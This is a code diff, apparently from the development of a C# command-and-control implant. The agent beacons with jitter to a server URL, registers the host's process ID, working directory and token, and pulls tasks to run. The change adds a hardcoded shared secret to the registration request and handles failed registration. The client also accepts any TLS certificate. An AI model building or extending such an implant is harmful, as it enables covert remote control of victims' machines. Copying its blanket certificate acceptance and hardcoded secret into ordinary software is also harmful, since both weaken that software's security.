@@ -12,6 +12,7 @@ class Agent
     static int    BEACON_BASE = 5;
     static int    BEACON_JITTER = 50;
     static readonly int    CMD_TIMEOUT_MS = 30000;
+    static readonly string AGENT_SECRET = "uma-chave-secreta-forte-aqui";
 
     static readonly HttpClient http = new HttpClient(new HttpClientHandler{
     ServerCertificateCustomValidationCallback = (sender, cert, chain, errors) => true
@@ -57,10 +58,8 @@ class Agent
     }
 
         // Loop de beacon
-        while (true)
-        {
-            try
-            {
+        while (true){
+            try{
                 await Register();
 
                 var tasks = await GetTasks();
@@ -319,6 +318,7 @@ class Agent
             pid       = Environment.ProcessId,
             token     = string.IsNullOrEmpty(agentToken) ? null : agentToken,
             cwd       = currentDir,
+            secret    = AGENT_SECRET,
             publicKey = publicKeyHex
         };
 
@@ -326,6 +326,12 @@ class Agent
         var    content  = new StringContent(json, Encoding.UTF8, "application/json");
         var    response = await http.PostAsync($"{SERVER_URL}/api/agents/register", content);
         string body     = await response.Content.ReadAsStringAsync();
+
+        if (!response.IsSuccessStatusCode){
+        Console.WriteLine($"[-] Registro falhou: {body}");
+        return;
+        }
+
 
         var doc   = JsonDocument.Parse(body);
         var agent = doc.RootElement.GetProperty("agent");
